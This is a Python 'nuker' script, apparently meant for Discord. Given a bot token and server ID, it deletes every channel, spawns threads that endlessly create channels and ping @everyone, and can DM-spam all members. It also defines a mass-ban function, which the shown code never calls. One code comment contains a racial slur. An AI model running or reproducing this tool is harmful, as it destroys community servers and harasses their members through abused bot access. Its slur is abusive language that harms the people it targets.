import requests, threading, time, random
import os

# === SPLASH SCREEN ===
def splash():
    os.system("cls" if os.name == "nt" else "clear")
    print(r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⣠⣄⠀⢻⣿⣿⣿⣿⣿⡿⠀⣠⣄⠀⠀⠀⢻⣿⣿⣏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⠀⠀⠀⠀⠰⣿⣿⠀⢸⣿⣿⣿⣿⣿⡇⠀⣿⣿⡇⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠙⠃⠀⣼⣿⣿⣿⣿⣿⣇⠀⠙⠛⠁⠀⠀⣼⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣷⣤⣄⣀⣠⣤⣾⣿⣿⣿⣿⣽⣿⣿⣦⣄⣀⣀⣤⣾⣿⣿⣿⣿⠃⠀⠀⢀⣀⠀⠀
⠰⡶⠶⠶⠶⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠉⠉⠙⠛⠋⠀
⠀⠀⢀⣀⣠⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠷⠶⠶⠶⢤⣤⣀⠀
⠀⠛⠋⠉⠁⠀⣀⣴⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣤⣀⡀⠀⠀⠀⠀⠘⠃
⠀⠀⢀⣤⡶⠟⠉⠁⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠉⠀⠀⠀⠉⠙⠳⠶⣄⡀⠀⠀
⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                 ✦ NUKER ✦
                   github.com/muzfr | @imneverenough  | 2025
    """)
    time.sleep(2)

splash()

# === SETUP ===
bot_token = input("Enter your bot token >>> ")
guild_id = input("Enter Guild ID >>> ")
channel_name = input("Enter base name for new channels >>> ")
dm_message = input("Enter DM message >>> ")
delay = float(input("Delay between each action (seconds) >>> "))
create_threads = int(input("How many channel creation threads? >>> "))
dm_enabled = input("Enable DM spam? [y/n] >>> ").lower() == "y"
ban_enabled = input("Enable mass ban? [y/n] >>> ").lower() == "y"


headers = {
    "Authorization": f"Bot {bot_token}",
    "Content-Type": "application/json"
}

# === DELETE EXISTING CHANNELS ===
def delete_all_channels():
    print("\n[*] Deleting all existing channels...\n")
    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers)
    if r.status_code == 200:
        for channel in r.json():
            channel_id = channel["id"]
            del_res = requests.delete(f"https://discord.com/api/v10/channels/{channel_id}", headers=headers)
            if del_res.status_code in [200, 204]:
                print(f"[+] Deleted channel {channel['name']}")
            elif del_res.status_code == 429:
                retry = del_res.json().get("retry_after", 1)
                print(f"[!] Rate limited on delete. Waiting {retry}s")
                time.sleep(retry)
    else:
        print(f"[!] Failed to fetch channels: {r.text}")

# === CREATE CHANNEL + SPAM @everyone ===
def create_and_ping():
    while True:
        name = f"{channel_name}-{random.randint(1000,9999)}"
        payload = {"name": name, "type": 0}
        r = requests.post(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, json=payload)
        if r.status_code == 201:
            new_channel_id = r.json()["id"]
            print(f"[+] Created channel: {name}")
            for i in range(10):
                msg = {"content": "@everyone"}
                ping_res = requests.post(f"https://discord.com/api/v10/channels/{new_channel_id}/messages", headers=headers, json=msg)
                if ping_res.status_code == 429:
                    retry = ping_res.json().get("retry_after", 1)
                    print(f"[!] Rate limited on ping. Waiting {retry}s")
                    time.sleep(retry)
                elif ping_res.status_code in [200, 204]:
                    print(f"[+] Pinged @everyone in {name} ({i+1}/10)")
                time.sleep(0.5)
        elif r.status_code == 429:
            retry = r.json().get("retry_after", 1)
            print(f"[!] Rate limited on create. Waiting {retry}s")
            time.sleep(retry)
        else:
            print(f"[!] Failed to create: {r.text}")
        time.sleep(delay)

# === DM ALL MEMBERS 5 TIMES ===
def dm_all_members():
    print("\n[*] DMing all server members...\n")
    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/members?limit=1000", headers=headers)
    if r.status_code == 200:
        for member in r.json():
            uid = member["user"]["id"]
            try:
                dm_res = requests.post("https://discord.com/api/v10/users/@me/channels", headers=headers, json={"recipient_id": uid})
                if dm_res.status_code == 200:
                    dm_channel = dm_res.json()["id"]
                    for i in range(5):
                        msg_res = requests.post(f"https://discord.com/api/v10/channels/{dm_channel}/messages", headers=headers, json={"content": dm_message})
                        if msg_res.status_code in [200, 204]:
                            print(f"[+] DMed {member['user']['username']} ({i+1}/5)")
                        elif msg_res.status_code == 429:
                            retry = msg_res.json().get("retry_after", 1)
                            print(f"[!] Rate limited on DM. Waiting {retry}s")
                            time.sleep(retry)
                        time.sleep(0.5)
            except Exception as e:
                print(f"[!] Failed to DM {uid}: {e}")
    else:
        print("[!] Could not fetch member list")

# === MASS BANN ALL MEMBERS NIGGA ===
def mass_ban():
    print("\n[*] Starting mass ban on all server members...\n")
    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/members?limit=1000", headers=headers)
    if r.status_code == 200:
        for member in r.json():
            uid = member["user"]["id"]
            try:
                ban = requests.put(f"https://discord.com/api/v10/guilds/{guild_id}/bans/{uid}", headers=headers, json={"delete_message_days": 1, "reason": "COM Client v2 | Server Nuked"})
                if ban.status_code in [200, 204]:
                    print(f"[+] Banned: {member['user']['username']} ({uid})")
                elif ban.status_code == 429:
                    retry = ban.json().get("retry_after", 1)
                    print(f"[!] Rate limited on ban. Waiting {retry}s")
                    time.sleep(retry)
                else:
                    print(f"[!] Failed to ban {uid}: {ban.text}")
            except Exception as e:
                print(f"[!] Error banning {uid}: {e}")
            time.sleep(0.5)
    else:
        print("[!] Could not fetch member list for bans")



# === EXECUTION ===
delete_all_channels()

for _ in range(create_threads):
    threading.Thread(target=create_and_ping, daemon=True).start()

if dm_enabled:
    threading.Thread(target=dm_all_members, daemon=True).start()

input("\n[+] Press ENTER to stop nuker...\n")
